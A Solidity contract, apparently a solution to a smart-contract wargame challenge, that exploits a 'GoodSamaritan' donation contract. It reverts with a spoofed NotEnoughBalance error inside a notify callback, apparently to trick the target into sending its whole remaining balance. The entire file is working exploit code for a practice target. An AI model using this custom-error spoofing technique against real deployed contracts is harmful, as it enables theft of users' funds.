// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./INotifyable.sol";
import "./GoodSamaritan.sol";
import "./Coin.sol";
import "./Wallet.sol";
import "hardhat/console.sol"; 

contract TransferDest is INotifyable {
    address markAddr; 
    uint count;
    
    error NotEnoughBalance();
    
    function notify(uint256 /*amount*/) external override {
        //revert NotEnoughBalance();
        console.log("count is %d", count); 
        
        if (count > 0) {
            console.log("throwing..."); 
            revert NotEnoughBalance();
        }
        else {
            
            GoodSamaritan mark = GoodSamaritan(markAddr);
            Coin coin = Coin(msg.sender);
            Wallet wallet = mark.wallet();
            
            console.log("coin.balances: %d", coin.balances(address(wallet))); 
            if (coin.balances(address(wallet)) > 0) {
                count+= 1; 
                mark.requestDonation();
            }
        }
    }
    
    function attack(address _mark) external {
        GoodSamaritan mark = GoodSamaritan(_mark);
        markAddr = _mark;
        mark.requestDonation();
    }
}
